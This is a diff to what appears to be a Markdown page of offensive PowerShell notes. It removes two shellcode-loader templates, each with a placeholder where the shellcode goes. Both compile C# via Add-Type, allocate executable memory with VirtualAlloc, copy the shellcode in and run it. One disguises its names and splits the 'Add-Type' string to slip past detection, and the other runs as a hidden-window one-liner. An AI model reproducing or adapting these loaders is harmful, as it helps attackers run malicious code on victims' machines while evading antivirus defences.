@@ -52,38 +52,6 @@ Add-Type $MyBusinessLogic
 [MyBusinessLogic]::Main()
 ```
 
-```powershell
-$X = [string]::Join('', ( @'
-using System;
-using System.Runtime.InteropServices;
-
-public class Zz {
-    static byte[] z = new byte[<bytes>] { <shellcode> };
-
-    [DllImport("kernel32.dll", EntryPoint="VirtualAlloc")]
-    static extern IntPtr V(IntPtr a, uint s, uint t, uint m);
-
-    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-    delegate void W();
-
-    public static void M() {
-        IntPtr p = V(IntPtr.Zero, Convert.ToUInt32(z.Length), 0x1000, 0x40);
-        Marshal.Copy(z, 0, p, z.Length);
-        W r = Marshal.GetDelegateForFunctionPointer<W>(p);
-        r();
-    }
-}
-'@ ).ToCharArray())
-
-&('Add'+'-'+'Type') $X
-[Zz]::M()
-
-```
-
-```powershell
-powershell -nop -w hidden -c "$c='using System;using System.Runtime.InteropServices;public class MyBusinessLogic{static byte[] b=new byte[80895]{ <shellcode> };[DllImport(\"kernel32.dll\")]static extern IntPtr VirtualAlloc(IntPtr a,uint s,uint t,uint m);[UnmanagedFunctionPointer(CallingConvention.StdCall)]delegate void W();public static void Main(){IntPtr p=VirtualAlloc(IntPtr.Zero,Convert.ToUInt32(b.Length),0x1000,0x40);Marshal.Copy(b,0x0,p,b.Length);W r=Marshal.GetDelegateForFunctionPointer<W>(p);r();}}';Add-Type $c;[MyBusinessLogic]::Main()"
-
-```
 
 ---
 
